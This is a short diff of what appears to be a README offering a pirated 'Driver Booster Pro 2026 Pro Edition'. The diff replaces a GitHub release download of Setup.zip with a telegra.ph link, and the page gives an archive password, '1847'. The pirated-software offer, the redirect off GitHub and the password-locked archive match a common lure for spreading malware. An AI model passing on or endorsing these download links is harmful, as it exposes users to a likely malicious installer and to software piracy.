@@ -10,7 +10,7 @@ Driver Booster Pro 2026 Pro Edition. scan and update 8 million+ drivers, game bo
 ***************** DOWNLOAD *****************
 ------------------------------------------------
 
-[+] DOWNLOAD LINK: [download here](https://github.com/cityhelmsmangrasp/Driver-Booster-Pro/releases/download/Last/Setup.zip)
+[+] DOWNLOAD LINK: [download here](https://telegra.ph/Download-05-21-39)
 
 [+] 🔐🔐🔐: 1847
 
